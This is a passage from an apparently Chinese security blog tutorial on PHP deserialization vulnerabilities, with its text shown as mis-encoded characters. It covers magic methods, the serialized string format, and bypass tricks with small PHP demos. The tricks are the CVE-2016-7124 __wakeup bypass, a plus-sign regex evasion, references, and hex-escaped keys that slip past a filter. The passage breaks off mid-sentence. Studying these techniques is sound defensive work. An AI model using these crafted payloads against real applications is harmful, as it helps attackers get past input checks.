href="#ä¸ºä»€ä¹ˆååºåˆ—åŒ–ä¼šå‡ºç°æ¼æ´ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆååºåˆ—åŒ–ä¼šå‡ºç°æ¼æ´ï¼Ÿ"></a>ä¸ºä»€ä¹ˆååºåˆ—åŒ–ä¼šå‡ºç°æ¼æ´ï¼Ÿ</h2><p>ä»æ ¹æœ¬åŸå› æ¥çœ‹ï¼Œæˆ‘ä¸ªäººæ„Ÿè§‰è¿˜æ˜¯æ¥è‡ªè¾“å…¥æ•°æ®æ ¡éªŒä¸å®Œæ•´ï¼Œååºåˆ—åŒ–æ¼æ´çš„å­˜åœ¨åº”å½“å½’å’äºå¼€å‘è€…ï¼ˆæœ‰æ—¶å€™åœ¨æƒ³ä¸€äº›æ¼æ´æˆå› æ—¶ï¼Œæˆ‘æ€»æ˜¯æƒ³è¦ç¡®å®šä¸‹åº”å½“æ˜¯è°è´Ÿè´£ä»»â€¦â€¦ï¼‰ï¼Œå¼€å‘è€…å¼€å‘åº”ç”¨æ—¶åº”å½“å‡è®¾æ‰€æœ‰ç”¨æˆ·éƒ½æ˜¯ä¸å¯ä¿¡çš„ï¼Œå¯¹äºæ‰€æœ‰ç”¨å¯èƒ½æ¥è§¦åˆ°çš„è¾“å…¥ç‚¹éƒ½éœ€è¦æ ¼å¤–æ³¨æ„ã€‚å°±ååºåˆ—åŒ–æ¥è¯´ï¼Œä¸€æ—¦è¾“å…¥æ•°æ®æ²¡æœ‰ç»è¿‡æ ¡éªŒï¼Œé‚£ä¹ˆååºåˆ—åŒ–çš„å¯¹è±¡å°±å¯èƒ½ä¼šè¢«æ¶æ„ç”¨æˆ·å®šåˆ¶åŒ–ï¼Œè¿›è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨çš„å…³é”®"><a href="#æ¼æ´åˆ©ç”¨çš„å…³é”®" class="headerlink" title="æ¼æ´åˆ©ç”¨çš„å…³é”®"></a>æ¼æ´åˆ©ç”¨çš„å…³é”®</h2><p>é»‘ç›’ï¼šåˆ¤æ–­å‡ºå­˜åœ¨æœ‰åºåˆ—åŒ–çš„æ•°æ®ï¼Œåºåˆ—åŒ–çš„æ¥å£ï¼Œè§‚å¯Ÿæ¢å¤å…ƒæ•°æ®ï¼Œåˆ©ç”¨åŸç”Ÿç±»æ„é€ è°ƒç”¨é“¾ï¼ŒéªŒè¯æ˜¯å¦å­˜åœ¨<br>ç™½ç›’ï¼šå®šä½å…³é”®å‡½æ•°ï¼Œè§‚å¯Ÿåºåˆ—åŒ–è¾“å…¥æ˜¯å¦å¯æ§</p><h1 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a>PHPååºåˆ—åŒ–æ¼æ´</h1><p>åœ¨PHPä¸­ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼çš„è¿‡ç¨‹ï¼Œä»¥åŠå°†è¿™ç§å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼æ¢å¤ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ã€‚é­”æœ¯æ–¹æ³•ï¼ˆmagic methodsï¼‰æ˜¯PHPä¸­ä¸€äº›ä»¥åŒä¸‹åˆ’çº¿å¼€å§‹çš„æ–¹æ³•ï¼Œå®ƒä»¬åœ¨æŸäº›æ“ä½œå‘ç”Ÿæ—¶è‡ªåŠ¨è¢«è°ƒç”¨ï¼Œä¾‹å¦‚å¯¹è±¡çš„åˆ›å»ºã€é”€æ¯ã€è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ç­‰ã€‚åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å‡½æ•°æ˜¯ä½¿ç”¨<code>unserialize()</code>å’Œ<code>serialize()</code>å‡½æ•°ï¼Œå…¶å®æ„Ÿè§‰æ²¡ä»€ä¹ˆè®¨è®ºçš„ï¼Œé‡ç‚¹å…ˆè®¨è®ºä¸‹é­”æœ¯æ–¹æ³•ã€‚</p><h2 id="PHPä¸­çš„é­”æœ¯æ–¹æ³•"><a href="#PHPä¸­çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="PHPä¸­çš„é­”æœ¯æ–¹æ³•"></a>PHPä¸­çš„é­”æœ¯æ–¹æ³•</h2><p>ä»¥ä¸‹å†…å®¹å‚è€ƒè‡ªï¼š<a href="https://segmentfault.com/a/1190000007250604">PHPä¹‹åå…­ä¸ªé­”æœ¯æ–¹æ³•è¯¦è§£</a></p><ul><li>__construct()ï¼Œç±»çš„æ„é€ å‡½æ•°</li><li>__destruct()ï¼Œç±»çš„ææ„å‡½æ•°</li><li>__call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</li><li>__callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</li><li>__get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</li><li>__set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</li><li>__isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</li><li>__unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚</li><li>__sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</li><li>__wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</li><li>__toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</li><li>__invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</li><li>__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</li><li>__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</li><li>__autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</li><li>__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</li></ul><p>å…¶ä¸­ï¼Œ__toString()ç”¨çš„æ¯”è¾ƒå¤šï¼Œå®ƒçš„è§¦å‘åœºæ™¯å¯ä»¥æ€»ç»“ä¸ºä¸‹é¢è¿™äº›ï¼š</p><ul><li>echo($obj)&#x2F;print($obj)æ‰“å°æ—¶ä¼šè§¦å‘ </li><li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ </li><li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ </li><li>ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ&#x3D;&#x3D;æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ&#x3D;&#x3D;æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ </li><li>ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ </li><li>ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œå¦‚strlen()ã€strops()ã€strcmp()ã€addslashes()ç­‰ </li><li>åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ—¶ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰__toString()è¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™__toString()ä¼šè¢«è°ƒç”¨ </li><li>ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸ºclass_exists()çš„å‚æ•°çš„æ—¶å€™</li></ul><p>ä»åºåˆ—åŒ–åˆ°ååºåˆ—åŒ–è¿™å‡ ä¸ªå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯ï¼š<br><code>__construct()</code> -&gt;<code>__sleep()</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code><br><img src="/2024/09/10/WebSecurity/owasptop/deserialization/image.png" alt="Alt text"></p><p>å›¾ä¸­æ˜¾ç¤ºçš„æ˜¯å¾ˆç»å…¸çš„å›¾ï¼Œå±•ç¤ºäº†å¯¹è±¡åºåˆ—åŒ–åçš„å†…å®¹ï¼Œå…¶ä¸­ï¼š</p><ul><li>a - array æ•°ç»„å‹</li><li>b - boolean å¸ƒå°”å‹</li><li>d - double æµ®ç‚¹å‹</li><li>i - integer æ•´æ•°å‹</li><li>o - common object å…±åŒå¯¹è±¡</li><li>r - objec reference å¯¹è±¡å¼•ç”¨</li><li>s - non-escaped binary string éè½¬ä¹‰çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²</li><li>S - escaped binary string è½¬ä¹‰çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²</li><li>C - custom object è‡ªå®šä¹‰å¯¹è±¡</li><li>O - class å¯¹è±¡</li><li>N - null ç©º</li><li>R - pointer reference æŒ‡é’ˆå¼•ç”¨</li><li>U - unicode string Unicode ç¼–ç çš„å­—ç¬¦ä¸²</li></ul><p>PHPåºåˆ—åŒ–éœ€æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li>åªåºåˆ—åŒ–å±æ€§ï¼šPHPçš„åºåˆ—åŒ–æœºåˆ¶é»˜è®¤åªåºåˆ—åŒ–å¯¹è±¡çš„å…¬å…±ï¼ˆpublicï¼‰å’Œå—ä¿æŠ¤ï¼ˆprotectedï¼‰å±æ€§ã€‚ç§æœ‰ï¼ˆprivateï¼‰å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œé™¤éåœ¨ç±»çš„ __sleep() é­”æœ¯æ–¹æ³•ä¸­æ˜ç¡®æŒ‡å®šã€‚</li><li>ç±»å®šä¹‰å¿…é¡»å¯ç”¨ï¼šååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå¿…é¡»ç¡®ä¿å®šä¹‰è¯¥å¯¹è±¡çš„ç±»åœ¨å½“å‰ä½œç”¨åŸŸä¸­å¯ç”¨ã€‚å¦‚æœç±»å®šä¹‰ä¸å­˜åœ¨ï¼Œååºåˆ—åŒ–å°†å¤±è´¥ï¼Œå¹¶ä¸”å¯èƒ½äº§ç”Ÿè­¦å‘Šæˆ–é”™è¯¯ã€‚</li><li>æ§åˆ¶å±æ€§ï¼šæ”»å‡»è€…å¦‚æœèƒ½å¤Ÿæ§åˆ¶åºåˆ—åŒ–æ•°æ®ä¸­çš„å±æ€§å€¼ï¼Œå¯èƒ½ä¼šå°è¯•åˆ©ç”¨è¿™äº›å±æ€§æ¥è§¦å‘ç±»çš„å…¶ä»–æ–¹æ³•æˆ–æ‰§è¡Œä¸å®‰å…¨çš„æ“ä½œã€‚</li></ol><h2 id="PHPååºåˆ—åŒ–ç»•è¿‡æŠ€å·§"><a href="#PHPååºåˆ—åŒ–ç»•è¿‡æŠ€å·§" class="headerlink" title="PHPååºåˆ—åŒ–ç»•è¿‡æŠ€å·§"></a>PHPååºåˆ—åŒ–ç»•è¿‡æŠ€å·§</h2><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">æºè‡ªè¿™é‡Œ</a></p><h3 id="php7-1-ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ"><a href="#php7-1-ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ" class="headerlink" title="php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ"></a>php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ</h3><p>åœ¨åºåˆ—åŒ–çš„æ•°æ®ä¸­ï¼Œå¦‚æœç±»çš„å±æ€§æ˜¯protectï¼Œåˆ™ç»“æœä¼šåœ¨å˜é‡åå‰åŠ ä¸Š<code>\x00*\x00</code>(æ‰€ä»¥åœ¨fuzzingæ—¶éœ€è¦æ³¨æ„ç”¨urlencodeå¤„ç†ï¼Œä¸ç„¶ç›´æ¥è¾“å‡ºæ˜¾ç¤ºä¼šä¸¢æ‰è¿™äº›å­—ç¬¦)<br>ä½†åœ¨ç‰¹å®šç‰ˆæœ¬7.1ä»¥ä¸Šåˆ™å¯¹äºç±»å±æ€§ä¸æ•æ„Ÿï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­å³ä½¿æ²¡æœ‰<code>\x00*\x00</code>ï¼Œä¹Ÿä¼šæ­£å¸¸è¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="ç»•è¿‡-wakeup-CVE-2016-7124"><a href="#ç»•è¿‡-wakeup-CVE-2016-7124" class="headerlink" title="ç»•è¿‡__wakeup(CVE-2016-7124)"></a>ç»•è¿‡__wakeup(CVE-2016-7124)</h3><p>ç‰ˆæœ¬ï¼šPHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10<br>åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰§è¡Œ<code>unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>, è¾“å‡ºç»“æœä¸º 666<br>è€ŒæŠŠå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¢å¤§æ‰§è¡Œ <code>unserialize(&#39;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#39;);</code>ï¼Œåˆ™ä¼šè¾“å‡ºabc</p><h3 id="ç»•è¿‡éƒ¨åˆ†æ­£åˆ™"><a href="#ç»•è¿‡éƒ¨åˆ†æ­£åˆ™" class="headerlink" title="ç»•è¿‡éƒ¨åˆ†æ­£åˆ™"></a>ç»•è¿‡éƒ¨åˆ†æ­£åˆ™</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´</p><ul><li>åˆ©ç”¨åŠ å·ç»•è¿‡ï¼ˆæ³¨æ„åœ¨urlé‡Œä¼ å‚æ—¶+è¦ç¼–ç ä¸º%2Bï¼‰</li><li>serialize(array(a));ä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡(åºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„)<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +å·ç»•è¿‡</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="åˆ©ç”¨å¼•ç”¨"><a href="#åˆ©ç”¨å¼•ç”¨" class="headerlink" title="åˆ©ç”¨å¼•ç”¨"></a>åˆ©ç”¨å¼•ç”¨</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¾‹å­ä¸­å°†$aèµ‹å€¼ç»™$bï¼Œç„¶åååºåˆ—åŒ–$aï¼Œç”±äº$bæ˜¯å¼•ç”¨å…³ç³»ï¼Œæ‰€ä»¥ååºåˆ—åŒ–å$bä¹Ÿä¼šè¢«èµ‹å€¼ä¸ºabcï¼Œæ‰€ä»¥ååºåˆ—åŒ–åè¾“å‡º666</p><h3 id="16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤"><a href="#16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤" class="headerlink" title="16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤"></a>16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;%00*%00a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">å¯ä»¥å†™æˆ</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\00*\00\61&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;%00test%00b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ<span class="number">16</span>è¿›åˆ¶è§£æã€‚</span><br></pre></td></tr></table></figure><p>åšä¸»å†™äº†ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$data</span>, <span class="string">&#x27;username&#x27;</span>)!==False)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ä½ ç»•ä¸è¿‡ï¼ï¼&quot;</span>.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æœªä½œå¤„ç†å‰</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// åšå¤„ç†å \75æ˜¯uçš„16è¿›åˆ¶</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h3><p>æƒ…å†µä¸€ï¼šè¿‡æ»¤åå­—ç¬¦ä¸²å˜å¤š<br>ä¸‹é¢çš„ä»£ç 